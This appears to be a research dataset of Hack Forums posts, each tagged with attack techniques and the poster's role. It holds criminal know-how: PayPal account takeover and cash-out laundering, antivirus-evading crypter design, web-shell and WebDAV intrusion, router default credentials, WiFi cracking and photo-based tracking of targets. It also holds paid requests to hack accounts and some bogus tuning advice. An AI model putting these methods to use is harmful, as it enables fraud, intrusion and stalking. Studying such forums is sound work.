Topic,Technique,Tactic,Role,Thread,Content
4 PIN PASSWORD HACK,"Brute force,Valid accounts,Drive by compromise",,Information Seeker,https://hackforums.net/showthread.php?tid=6096889,"So there is a password between 0000 - 9999, and you have max 4 tries to get it right. is there some way i can do to crack the password?"
I need Mentor (Paid Service),Obtain capabilities,,Buyer,https://hackforums.net/showthread.php?tid=6096733,"Hello, I need a mentor for some black hat techniques, it will include, ewhore, photoshop, if you can guess, you can pm me. I have some doubts, if you can clear my points, you can make a good deal. Deep knowledge is required, pls new joiners, and new comes are not welcome. Experienced people with good rank pls pm, we can open a contract, and I Have no issues going first, if you the one, who I am looking ? Thanks"
Get Maximum Internet Speed,Obtain capabilities,,Author,https://hackforums.net/showthread.php?tid=6095882,"This tutorial will show you how to get maximum internet speed. First, 1.Open your Network and Sharing center. 2.Click on Local Connection. 3.Click on Properties. 4.Then Double click Internet Protocol Version 4. 5.Change Obtain DNS Server Automatically to Use Following DNS Server. 6.Type in Preferred DNS Server = 208.67.222.222 7.Type in Alternate DNS Server = 208.67.220.220 8.Click OK, then OK, then Close everything until Desktop Appears. 9.Restart your PC/Laptop and see the difference. Then, 1. Go To Run 2. Type system.ini 3. Copy and Paste (Delete Everything) page buffer=100kbps load=100kbps Download=100kbps save=100kbps back=100kb 4. Then Save Run notepad as administrator Going forward I Would Recommend Installing the following softwares: 1.)If Your using wifi then use TCP OPTIMIZER Smiling 2.)You Can even use Getfullspeed If u think it works..:/ 3.) Use IDM...im damn sure u guys would use it Abiggrin 4.) Use RAMRUSH its a pretty cool software which optimizes ur ram and interent speed Abiggrin 5.) Last but not the least download AUTOBAHN ...its a small software that runs in the background...and reduces time to buffer video and internet speed"
Verify Phone Number,Obtain capabilities,,Vendor,https://hackforums.net/showthread.php?tid=6096724,I am not sponsored but I have used them many times before and they are legit and good! Works on practically any website. https://www.textverified.com/
How to set Kali linux for Hacking,"OS credential dumping,Develop capabilities,Hijack execution flow",,Information Seeker,https://hackforums.net/showthread.php?tid=6096649,"Hi all, May i ask what are the required hardwares and applications to set up kali linux for hacking wifi? I'm planning to build a computer just for learning how to hack but I'm don't know where to start. Could I get a low budget computer for this? Thank you all."
How to use the WebDav exploit to hack RDP's-with tools[Updated 08/5/11],"Exploitation of Defense Evasion,Impair Defenses",,Author,https://hackforums.net/showthread.php?tid=1430396,"Alright guy's today in this tutorial I'll be explaining how to use the webdav exploit. The link for the tools used for this tutorial can be found in the bottom of this tutorial. For those of you who do not know what a Webdav is here is the definition Code Web-based Distributed Authoring and Versioning, or WebDAV, is a set of extensions to the Hypertext Transfer Protocol (HTTP) that allows computer-users to edit and manage files collaboratively on remote World Wide Web servers. But fo our purpose we will be using it to exploit RDP's or the Remote Desktop Protocal. For a better understanding of these with RDP's they could range from Vp's to Dedi's to just plain old home Pc's, but no matter what it is you will gain full access to the machine and can basically do whatever you want using a shell. For those of you who are new to the hacking scene a shell is a php script that allows you to view all of the files on the server you decide to host the shell on. The most common shells are the c99 or the r57, but in this case we will be using the c99. Now please be aware these are not the only shells available there are several posted throughout the forum and you can find them by simply using the search button located on the navbar. Now before being able to use the shell we have to find some vulnerable Ip's to gain access to for this we will be using the WebdavlinkCrawler which can be found in the webdav tools kit I have provided below here if you don't trust my download links simply don't download them it's that simple. Once you have managed to open the program you will be presented with this interface."
[Keywords List] Easy Leeching,"Develop capability,External Remote Services,Exploitation of remote services",,Author,https://hackforums.net/showthread.php?tid=6071143,"Most of the crackers there know, your results are only as good as the keywords used. I've seen people wasting so much time searching for keywords, so here's a good list that will be helpful to crackers. I hope it'll be helpful to others."
hack discord,"Drive by compromise,Exploitation for credential access",,Information Seeker,https://hackforums.net/showthread.php?tid=6095693,"Hello, someone has shared a lot of privates things like pictures and mails of me on severals servers on discord. That's why i'm looking for someone who can hack a discord account. I really need help and i can pay for it because its a very hard situation for me."
[Tutorial] ~ DNS Rebinding ~ Hacking Routers and Taking Names,"Develop capabilities,Network service discovery",,Author,https://hackforums.net/showthread.php?tid=3937393,"Hey guys :D Alright, this is going to be a tutorial about DNS rebinding, what it is, how to do it, and how to protect against it. What you'll need: A Web Server Register a NameServer on your domain (Free) Rebind (download here) 1. What is DNS Rebinding? I'm so glad you asked. DNS rebinding occurs when a web server provides an IP that is different than its own, generally for potentially malicious reasons. The attack vector is providing the IP of the client in order to perform Cross Site Request Forgery attack. We will be using this to 'hack' routers. This works because somewhere between some and many consumer-grade routers are configured in such a way that, when you type the external IP address of the router from within the local LAN, it will take you to the router configuration page. The reason this works is because the router checks only where the packet is going, and not the interface through which it came in. This means that an internal host can access the router by the router's INTERNAL or EXTERNAL IP. However, an external device can not access the router at all (without DNS rebinding or some sort of attack)."
[Tutorial Compilation] Goodies' Official Hacking Tutorial Compilation Thread,Develop capabilities,,Author,https://hackforums.net/showthread.php?tid=4075289,"Hello everyone! Over the few years on HF, I've written quite the collection of tutorials. The following list is not a summation of all of my tutorials, but only the few that I deem important. Many of them are fairly esoteric, but with practice and determination, they can be followed and understood by anyone. I don't claim that these are incredibly advanced; that's not what I'm about. However, if you plan to expand your skill level, I suggest you view these tutorials. If you have any questions, feel free to post on the respective thread or PM me directly. Thank you. Note: Many of these threads have taken me upwards of 5 hours (each) to write. I'd appreciate any posts/s of my threads to increase recognition."
[tutorial] Hacking into buildings via social engineering,"Exploit public facing application, Drive by compromise, Valid accounts",,Author,https://hackforums.net/showthread.php?tid=6095321,"Porky here with a tutorial. What is Social Engineering? According to Wikipedia, Social engineering, in the context of information security, is the psychological manipulation of people into performing actions. In short, it is human-hacking. What are some human-hacking techniques?? There are many, but in this tutorial, these are relevant: 1. Authority: Proving to the target you are important 2. Familiarity: Make the target like you, leading to-- 3. Trust: Manipulating the target because ""you know better"" How is this applied in buildings? 1. Authority: Wear extra good clothes and people will think you are a rich, high-ranking individual. Body language/communication skills also help. 2. Familiarity: Make friends with employees and guards. Show that you know about the people there. Talk to people regularly. 3. Trust: This one is simple. Now that everyone trusts you and think you're an important person, you can talk your way through things. Note: Personally I found scouting the company through OSINT helps in the Familiarity stage. Showing that you've ""been to the company"" shows that you actually work there or are known there. For example asking if the boss is present and calling them by their first name. In a pentest, you can pivot this social engineering attack into wireless hijacking, lunchtime attacks, or shoulder surfing. Thoughts in comments."
[tutorial] SAFELY Lose OPSEC and Become famous as a white hat hacker,"Develop capabilities,Network service discovery",,Author,https://hackforums.net/showthread.php?tid=6095524,"Hi, Porky here What is OPSEC? It's when you protect your personal info to avoid getting your data leaked to bad actors. In what circumstances do I need to get rid of OPSEC? 1. You need to show off your technical/hacking skills so you can get visibility to company headhunters 2. You want to become famous in infosec as a hacker 3. You want collaborations/more gigs and more work, hence more side income How do I lose OPSEC safely? DO's 1. DO show your business email address/telephone 2. DO show off resume and your skillset: experience in coding, pentesting experience, specialization in hacking, etc. 3. DO make social media specific to infosec that talks about your hacking adventures 4. DO interact with other infosec people. Send vulnerability reports, send suggestions to NIST/MITRE, etc. DO NOT's 1. DO NOT show your house address and personal number/email 2. DO NOT share your family info/relationships info 3. DO NOT divulge your property info/ car model/ phone model/ computer OS 4. DO NOT mix personal life info in social media unless hacking-related Bonus: Make layers-upon-layers of OPSEC identities outside of this. One OPSEC identity for video games, one identity for online forums, one identity for posting memes, etc."
PASSWORD CRACKING - CREATE THE BEST BRUTE FORCE WORDLIST,"Brute force,Valid accounts,Drive by compromise",,Author,https://hackforums.net/showthread.php?tid=6082491,"This tutorial will show you how to create the BEST wordlist for fast bruteforce password cracking. This should be used if dict attacks have failed. As with all my tutorials - USE LINUX. There is no reason not to, it takes 30 minutes and its way better for hacking. It also uses way less system resources, which is important for stuff like password cracking as it's resource intensive. If you can't set linux up just post/PM and I'll help. 1) get Crunch - type in terminal: sudo apt-get install crunch 2) You use crunch like this: crunch <min> <max> <charset> -t <pattern> – o <filename.lst> min = minimum length of the password max = maximum length of the password Charset = Which characters you want to add in your wordlist like abcdefghijklmnopqrstuvwxyz or 1234567890. You will need to do upper and lower case if you want all of them. -t <pattern> = This is the pattern you want to follow. Lets say you saw them enter the first three letters ('cat' and know the last letter is 'x') and it's an 6 digit password, you could do something like: cat@@x This will make all passwords start with cat and change the characters that use @. -o <output?> is what you want to call the output file. 3) so type: crunch 6 6 abcdefghijklmnopqrstuvwxyz -t cat@@x -o catfile.lst 4) type: cat catfile.lst 5) You should see something like: catusx catutx catuux catuvx catuwx catuxx catuyx catuzx catvax catvbx 6) you can do more complicated things with other options if you need to. 7) be careful of opening a big wordlist in an editor/terminal. It might crash your system if it's too big. There are special tools for editing them. 8) use this with your favourite password cracking program"
"What is Port Forwarding ?,How To Port Forward ? Now With Utorrent!","Network sniffing,Network Service Discovery",,Author,https://hackforums.net/showthread.php?tid=6095202,"What Is Port-forwarding? Port forwarding is necessary for using different tools, Such as RATs and uTorrent and so on. Please follow this guide on How To Port Forward and you'll have your port forwarded Smiling! Today i'll teach you how to port forward through the router & modem. (Not with PFConfig Smiling ) Lets Start! Start off by going to: Code Start -> Run -> CMD -> And Type IPCONFIG [Image: f512c0.png] Now Copy That ""Standard Gateway // Default Gateway"" IP And Type It Into Your Webbrowser & Log in. My username is Root - nothing. The router // modem accounts usually are theese: Admin - Admin Admin - Password Admin - User Admin - Root Admin - Custom Password, Check underneath your router for it! Awink Root - Admin Root - Root - Password Root - Root Root - Password Root - Custom Password. Check underneath Awink User - Root User - User - Admin User - Password User - User User - Custom Pass. And so on. Once you're logged in, Go to the ""port forwarding"" or in this case, ""Virtual Server"" [Image: 4beaed.png] [Image: f85ef9.png] Virtual Server: Enable / Disable. Local IP: Found In IPConfig, As IP Adress. Start Port: The Port You Want To Forward, Start Port. End Port: The Port You Want To Forward, End Port. Protocol: TCP & UDP or BOTH Remark: The Name Of The Wished Forwarded Program. And When You've Saved The Settings, Go To Canyouseeme.org And Type Your Port In There, And If It Says [Image: f1d55d.png] Then You've Succeded Your Port Forwarding. If It Says [Image: 65ef76.png]"
Beginners Guide to Crypters and Stub,"Develop capabilities,Data encrypted for impact",,Author,https://hackforums.net/showthread.php?tid=207201,"PART 1: Que. What this tutorial covers? Ans. Spoiler (Click to View) Crypters Spoiler (Click to View) FUD Spoiler (Click to View) Parts of a Crypter Spoiler (Click to View) Types of Crypter Spoiler (Click to View) How long my Crypter will be FUD? Spoiler (Click to View) Please DO NOT pm me regarding this tutorial. Post any queries you have in the thread, me or any other HF member will surely help you and reply to your queries."
[Tutorial]Understanding Crypters[VB6 / VB.NET],"Develop capabilities,Data encrypted for impact",,Author,https://hackforums.net/showthread.php?tid=2591147,"And Don't leech Visual Basic 6: If your developing a crypter your wondering why is it being detected by AVs. One of the main reasons is that your working on a stub programming it in Visual Basic 6 and the encryption modules require functions that need API codes. When you compile your stub it will leave in plain text what API functions that are needed. Example, ""Phizo is in his VB6 workspace in the Forms section theres frmStub, in the code it contains instructions to hide the visual form and his modules section it says ""mMain"", ""mRC4"", and ""mRunPe"" he finishs coding the modules but with execption that mRC4 and mRunPe where from a older crypter source"" The errors that Phizo made that modules where unencrypted, and where from a older crypter source that AVs where able to detect right of the back because AVs reconize the functions for RC4 and RunPE. To prevent this you need a use a source undetector tool or you encrypt it your self, this will mask the API function names and dependicies. Another reason is the basic information thats given to exe-file like: ""Company"" ""Product name"" ""Copyright"" and less likely the Icon (you can use AVs icon to prevent .ico detection) To prevent this you can use random names like ""jahjJKAHjkhdas"" for Company Value, ""dcjkdfjkHJ"" for the Product name and you know what I mean but make sure that you're code has a update function so when it downloads a new stub it will change the unqie random name(s) because sooner or later AVs will match that with your detected stub. But AVs can detect Heuristics of the VB6 file if it contains certian amount of malware traces it will probally say its a ""Trojan/Heuristic, Trojan/Generic, Malware.Gen, and etc"" If you want a fully undetectable result you must know what the AVs are looking at so you can cover that hole thats the hard part but so simple. 3.5/4.0 .NET Framework Making a crypter in .NET makes it look nice and orginized but it gives off to much info. The mistakes of .NET stubs is the basic info of exe-files and .NET modules that can be easily decompiled and reconize your coding. You can encrypt the modules but AVs have so much methodology that I wouldn't recommand making a EXE based stub, I recommand making a DLL Stub with EXE Loader so there are three componants in a DLL based cryption. DLL Stub benefits: #1 Random or Encrypted function names #2 Random or Encrypted functions #3 Random or Encrypted API #4 Unknown rootkit for kernel level bypass What is the EXE Loader for? The EXE loader will load & exeute the DLL stub to process the encrypted malware at a non exe level. That means AVs will have to go to deeper level in the Windows system that will trigger it self as malware, thats only if the DLL stub is designed to stealthly reach that level without detection of privilages. Its just that .NET framework has pros and cons that differ from VB6 pros and cons. Other way the VB.NET crpyts that it resources has a source code stub and a encrypter then it injects the compiled source code stub into the file you want along with a decrypter for that kind of encryption. AVs will pick this type of method a VB.Injector/MSIL/Injecter.a, or Gen:Kazy.Variant 87364 and blah blh you. One more important thing when u scan with mutli engine anti virus online if they say its a dropper then you'll have to hide and encrypt the dropper code, a injector will it will detect the ""injected"" decrypter for the file. Now you understand? Heres picuter of my crypter SO FAR:(LOL) [img]http://www.hfimage.net/images/tju87tvffcp8x1m2pkk3.jpg[/img] Here's download link to my full work(wit picture): Mediafire"
[tutorial] How to do simple XSS,"Drive by compromise,Exploitation of Remote Services",,Author,https://hackforums.net/showthread.php?tid=6095097,"Hi, Porky here with a tutorial What do I need to learn to do XSS 1. Basic HTML tags 2. Basic to advanced Javascript WAF Bypass is a bonus What is XSS XSS (Cross-site scripting) is an attack where you input code that gets reflected on the website view. You input a piece of data, for example HTML code, and it is ""injected"". For example, you search Hello World in a search bar The website source code shows this: Code <b>searched for: Hello World</b> [Image: Untitled.png] You can insert an HTML input, for example Code <font size=20>Big letters</font> Which would result in: Code <b>searched for: <font size=20>Big letters</font></b> [Image: Untitled2.png] And if you add <img src=https://...sourceofcatpicture...></img> [Image: Untitled3.png] Note: There are security measures in place to protect from such an attack. However, very simple/primitive or insecure websites might be vulnerable. In some cases, WAF evasion might be needed. You can try some here: http://testphp.vulnweb.com (a legal target practice website). I posted a similar attack in my old account here (I requested it closed): [writeup] How I hacked a mall kiosk Add thoughts in comments"
[tutorial] how to know someone's geolocation based on photo,"Data from information repositories,External remote service",,Author,https://hackforums.net/showthread.php?tid=6094570,"Hi, Porky here What is EXIF Metadata? EXIF (EXchangeable Image File format) metadata allows extra info to be injected into a photo that can talk about it, e.g. device type, device name, geolocation, date and time of retrieval, etc. If EXIF metadata geolocation is turned on in a phone, a person can be tracked! 1. Find target's photo online 2. Download it (Right click > Save image as) or view the image (Right click > View image) 3. Go to a metadata service online (my favorite is Metapicz) 4. Input either the downloaded image or the URL of the image you viewed 5. Results! Note: Many social media these days ""strip"" the photos of their EXIF metadata (for security reasons). However, if you could access the files from outside the social media platform, it might still be effective. Thoughts in comments."
Another way to delete locked/hidden/protected files!,"Data destruction,Data encrypted for impact",,Author,https://hackforums.net/showthread.php?tid=6095197,"Hi, just a tut written by me again. You probably see it before, a file/map cant be deleted , because its locked/in use/protected. Well, there are some small softwares for it, like Unlocker. (google it) But what if this is not working either. Here a simple way to do delete map/files.. 1. Install a server software , like WAMPP. 2. Make sure its running and you can view it by localhost. 3. If its working, and load the welcome pages, go to c:\wamp\htdocs\ . 4. Download a shell like r57 or c99. Save it as .php so you can view the shell. 5. Browse to the shell: http://localhost/c99.php , and go to the map/file you want to delete. You'll see you can delete it :) I was able to delete some service pack 2 / 3 folders on my ext. disk, that were not valid anymore. But i couldn't delete it the normal way, so I did it this way as described above. Okay, it will not work on some files/maps, because those are really from your operated system and are needed for running your pc."
How to delete personal information about myself on the Internet,Obfuscated files or information,,Author,https://hackforums.net/showthread.php?tid=6095196,"Hello HF Members, If you find personal information about yourself on the Internet, it can be very difficult, if not impossible, to get that information removed. In most cases, once information is on the Internet, it is there to stay. Whether other people can find it, depends on how easy it is to find through a web search engine. Removing personal website If you own the website where your personal information is found, you can remove the information from the web pages or you can delete the web page or website entirely. If you want to keep the information online, but do not want search engines to find the information, you can password protect the information. Or, set up a robots.txt file to indicate to search engines that all or part of your site should not be indexed. Keep in mind, however, that search engines crawling your site are not required to honor the robots.txt file. Remove social networking site data For social networking websites like Facebook, Twitter, and other social networking sites, you can choose what personal information to displayed to other users. These settings are found through the Privacy settings in each of the services. However, some of the information may be publicly displayed or have the potential of being displayed in the future. Removing information from someone else's website If your personal information is on a website you don't control, you can attempt to ask the webmaster or web host of the site to remove your information. In some cases, after time they may comply with your request. Removing link to a site from search engines Many search engines have policies where they remove the links to sites based on the content. When we say ""remove,"" we mean that the links are no longer indexed, but the information remains on the Internet. For example, Google may remove links to pages that contain any of the below personal information. National identification numbers, such as U.S. Social Security Number, Argentina Single Tax Identification Number, Korea Resident Registration Number, China Resident Identity Card, etc. Bank account numbers. Credit card numbers. Images of signatures. Removal information from Google Best practices to follow when posting information As a best practice, always be mindful of what you divulge to anyone or any company on the Internet. On chat sites and social networking sites, if you don't want someone to spread information about you around the Internet, don't say it or type it. The best way to keep personal information to yourself is keep it personal, that is to say, keep it to yourself. The Internet is vast, and word spreads fast!"
"[tutorial] Force ""400 Bad Request"" (and possibly cause removal of SSL)","Brute force,Valid accounts,Exploitation of remote services",,Author,https://hackforums.net/showthread.php?tid=6095103,"Hi, Porky here with a writeup. What is URL encoding? Webservers have a specific encoding called URL-encoding where characters are assigned a %-based code. For example: %30 is for 0 %00 is for � %20 is for space and so on. This leads to an informational vulnerability where adding 2 or 3 %-signs cause a sort of multiple-encoding. This means adding %%% at the back of a website causes a ""400 Bad Request"" error when done. You can use Acunetix' legal test website to test such a vulnerability. The normal result: http://testphp.vulnweb.com/ The Bad Request result: http://testphp.vulnweb.com/%%% This can be used to do fingerprinting on the website version because 400 Bad Request pages sometimes show the website version, allowing you to know which exploits to use."
Password cracking and post-exploitation of wifi network - Tutorial part 1,Exploitation for credential access,,Author,https://hackforums.net/showthread.php?tid=6064252,"Recently, browsing this forum, I noticed a lot of requests regarding help with WiFi hacking / post-exploitation of the network I was able to access. I know that in this forum there are many people starting their adventure with wireless network pentests. So I decided to try to create a mini-tutorial based on my own experience in this field which will be a good starting point for many people. It will not be a comprehensive bible of penetration tests, but rather a specific alphabet. Therefore, I cordially invite all experts on the subject to comment / describe their own ways, the more so that you can say a lot about this topic and what I will present is just a tiny drop in the sea of possibilities. And if I have made a mistake in this guide, I will be obliged if you write to me about it. I want this tutorial to be a solid source of knowledge and not mistakes😁️ YOU NEED: FOR A GOOD BEGINNING: - A computer with any linux (it may be windows even though you may have a problem with the availability of some software and running it can sometimes cause problems. Well, if you do things like hacking, it would be good to have the ability to work with linux, however, I myself this guide will be limited only to linux, and exactly known to all kali linux😄️). - Internet access (to download software / use additional tools). - Network card that supports packet injection and work in monitor mode (I use Alfa AWUS036NH myself, but it may well be another one that supports the above modes. In addition, I recommend buying an external antenna, although this is not required). - Willingness to learn and the ability to think logically😂️ NECESSARY SOFTWARE: - Aircrack-ng - Macchanger - Thc-hydra - Nmap - Routersploit - Crunch - Nmap Script Engine (installed by default with nmap, additional scripts to download on the internet) - Arpspoof - Dnsspoof ADDITIONAL TOOLS / ONLINE SERVICES: - MACVendors.com - WiGLE: Wireless Network Mapping - GPUHASH.me (if the computing power of your machine is too low, of course you can use other similar sites). - Dictionaries for cracking passwords and lists of default usernames (on the Internet there are many different dictionaries / lists of usernames ready for download that are worth buying, but in the rest of this guide we will generate our own dictionaries. Why will I list the usernames later? ) COMPLEMENTARY KNOWLEDGE: As I said at the beginning, hacking is a river topic, which is why I put a short list of books that are worth using while learning how to hack wireless networks and more. I used them myself and I think it is a good source of supplementary knowledge. Of course, I don't force anyone to study here, but I highly recommend it because such knowledge only pays off later - Vivek Ramachandran - BackTrack 5 Wi-Fi penetration tests. - Hertzog Raphaël - Kali Linux Revealed. - Zetterström Sven-Erik - Basic Wifi-Hacking. - Lee Barken and others - Wireless Hacking. - Kim P. - Pentester Handbook. IT systems security. - Georgia Weidman - Penetration Testing: A Hands-On Introduction to Hacking. - John Chirillo - Hack Wars Volume 1 and 2. - Chris Sanders - Practical package analysis. Using Wireshark to solve network problems. PREPARATION: To start with, let's start by updating our system (I use apt but you can use another package manager present on your system): Code apt-get update && apt-get dist-upgrade Now let's install the necessary packages listed above (if you haven't done it before, if you use kali linux then most of the tools are pre-installed🙂️): Code apt-get install PACKAGE NAMES SEPARATED WITH SPACE If you cannot install any of the programs via your package manager, google looks for information on installing it on your operating system. There will be plenty of information there Now we connect our network card and check its correct operation: Code Airmon-ng After typing this command into the console, we should see information about our wireless network interfaces (in turn: physical address, interface name, driver and chipset). We choose and remember the name of the interface we want to use. Then let's kill all processes in the system that may interfere with our card's work and run it in mixed mode (Promiscuous mode). We issue the following commands: Code airmon-ng check kill Code airmon-ng start INTERFACE NAME Now we can check the correctness of the above commands by typing ""ifconfig"" if one with the ending ""mon"" appears on the interface list, everything is ok Now let's generate some simple dictionaries using the crunch tool. For the purposes of this tutorial, we will generate a simple set of numeric dictionaries (only numbers) which does not mean that you should only use them in your everyday work. It is good to get different sets of dictionaries available online in advance. As usual, Uncle Google is waiting for you to ask him the right question and of course you should have enough free disk space. Dictionaries like to take up a lot of space😃️ Generating a 8-character dictionary: Code crunch 8 8 1234567890 -o /PATH/TO/SAVE/LIST.TXT Generating a 10-character dictionary: Code crunch 10 10 1234567890 -o /PATH/TO/SAVE/LIST.TXT Generating a 11-character dictionary: Code crunch 11 11 1234567890 -o /PATH/TO/SAVE/LIST.TXT Generating a 12-character dictionary: Code crunch 12 12 1234567890 -o /PATH/TO/SAVE/LIST.TXT Finally, a 13-character dictionary: Code crunch 13 13 1234567890 -o /PATH/TO/SAVE/LIST.TXT After these endeavors, we will be ready to act, so we will fly with it without delay"
How to hack paypal account,"Develop capabilities,Hijack execution flow",,Author,https://hackforums.net/showthread.php?tid=91427,"am not gonna explain and induce you to hack paypal acounts and misusing them i am just telling to protect your paypal account to get been hacked . I am not responsible for what u do with this tutorial You are responisble for your own deeds and god will punish you not me laugh.gif Basicaly in today internet world we have to sign up in many forums , many emails, etc . But question arises how can we rember all passwords of all forums,sites,emails,paypal etc so we use common sense and use same password for all places AND That is the big mistake . Hacker take advantage of this even me laugh.gif lol so what basic principle is hacker hack one email or forum password through trojan or phishing then they can type email to paypal( which they stolen from forum or phishing email account like yahoo,rediff) and type the same password he was using on different forum. Let say I got one email and password of yahoo account ??( note this is random account it is useless tongue.gif ) email: hacking_is_not_crime@yahoo.co.uk password: godzilla123 what can i do with it? first thing i will go to paypal and type that email and type that password he was using on yahoo account and beleive me 60% you will logged in the account ohmy.gif .But what i can do more i can type email hacking_is_not_crime@yahoo.co.uk in google search and i can find out that where more this person is registered i can go to those forums,or sites and try my luck hoping he will usee same password for everywhere What Black Hat Hackers Do??( hacker who hack for money) what they do is just buy big email and password list or arrange from somewhere then enter email and password in paypal and start hacking money from them! So hacking paypal is too easy to take advantage of people foolishness of using same password everywhere second way of hacking unverified ( non added credit card,bank account or debit card)paypal account This technique has some limitation and again it is the advantage of user foolishness sometime what happen is when person is signing up the account Fastly he forget to type security question and Then hacker make advantage of it. so simple thing what all hacker do is find victim phone number or adress block number. we can easily hack our freind accounts by this way as we know where they live or we know their phone number so what all hacker do is click on forget my passsword type email adres then type phone number to confirm identity then hacker can change the password IF - victim didnt written option of securtiy question then it will go directly to change password How do hacker transfer money from paypals or using paypals? What paypal hacker hate is when he is using paypal and then paypal put restriction on hacked paypal or put security question page where we have to type credit card to verify that we are the owner so hacker hate that like this also when hacker transfer money from hacked pp to his pp( Paypal) then paypal company reverse the money and put that hacked pp in Limited mode where user cannot send money How Security Page come? Basicaly when in 1 one day paypal is logged in with different country Ip's then paypal automatic machine will put account on securty page. Let say real owner live in US he logged in on 2 november 2008 then hacker loggen in with ip of canada on 2 november ( on the same date real owner logged in ) then automaticaly security page will come How hacker avoid security page? They use same country SOCKS ( socks is the proxy it is basicaly to change ip to different country hacker often use this) real owner has . they will firstly logged in with any country ip hoping owner didnt logged on that same date then hacker will click on profile and see which country does he belong to then after that he will use that country socks Note: on the same date hacker cant use even the real owner country after using different ip . in simple term on 1 day 1 country ip How hacker protect themseleves to get been caught? They use socks or VPN ( Virutal Private Network ) hacker prefer use to socks rather then proxies because proxy store real ip information whereas socks dont socks or vpn accounts dont store real ip logged in information.because if they use proxy and paypal company will know about that proxy they will contact them and know real ip logged in so hacker use SOCKS V5 for more information on socks you can see How hacker avoid to reverse the payment they transfer to their account? when hacker have to buy something from hacked paypal they dont buy from hacked paypal they transfer the money to their paypal then use it but nowdays paypal been more smarter they reverse the payment but now days hacker are been more smarter what they do is transfer money to fake pp then transfer from that fake pp to one more fake pp then transfer from second fake pp to their own account that way it will be difficult for paypal to reverse not impossible but difficult second way ( Credits Shafe ) hacker used to transfer money then on real account they will change all details of profile ,change password, security question and remove credit card . that way it is difficult to reverse again not imposible but difficult so at end i want to conclude that dont put yourself in this paypal hacking because using other person money is stealing their sweat i just give this info FOR education only you may hide from police or paypal but you cant hide from god dry.gif i just told this info so that i can guide u DONT USE SAME PASSWORDS for everywhere you can make one text document and write your all password there if u cant rember.."
Trojan horse,"Impair Defense,Exploitation for defense evasion",,Buyer,https://hackforums.net/showthread.php?tid=6094654,Hello Hack forums! I'm new here and looking for someone who can make the Trojan horse for a job purpose. It's not that illegal and I do not want to twist any information. I want to be able to remotely control a computer for about 5 minutes thats it. Then it's done. Of course I pay for the service. Anyone know this or know where to look? Regards Neal
"Worm, Virus & Trojan Horse Tutorial","Impair Defense,Exploitation for defense evasion",,Author,https://hackforums.net/showthread.php?tid=6038326,"Some of the skills that hackers have are programming and computer networking skills. They often use these skills to gain access to systems. The objective of targeting an organization would be to steal sensitive data, disrupt business operations or physically damage computer controlled equipment. Trojans, viruses, and worms can be used to achieve the above-stated objectives. In this article, we will introduce you to some of the ways that hackers can use Trojans, viruses, and worms to compromise a computer system. We will also look at the countermeasures that can be used to protect against such activities. Topics covered in this tutorial What is a Trojan? What is a worm? What is a virus? Trojans, viruses, and worms Countermeasures What is a Trojan horse? A Trojan horse is a program that allows the attack to control the user’s computer from a remote location. The program is usually disguised as something that is useful to the user. Once the user has installed the program, it has the ability to install malicious payloads, create backdoors, install other unwanted applications that can be used to compromise the user’s computer, etc. The list below shows some of the activities that the attacker can perform using a Trojan horse. Use the user’s computer as part of the Botnet when performing distributed denial of service attacks. Damage the user’s computer (crashing, blue screen of death, etc.) Stealing sensitive data such as stored passwords, credit card information, etc. Modifying files on the user’s computer Electronic money theft by performing unauthorized money transfer transactions Log all the keys that a user presses on the keyboard and sending the data to the attacker. This method is used to harvest user ids, passwords, and other sensitive data. Viewing the users’ screenshot Downloading browsing history data What is a worm? A worm is a malicious computer program that replicates itself usually over a computer network. An attacker may use a worm to accomplish the following tasks; Install backdoors on the victim’s computers. The created backdoor may be used to create zombie computers that are used to send spam emails, perform distributed denial of service attacks, etc. the backdoors can also be exploited by other malware. Worms may also slowdown the network by consuming the bandwidth as they replicate. Install harmful payload code carried within the worm."
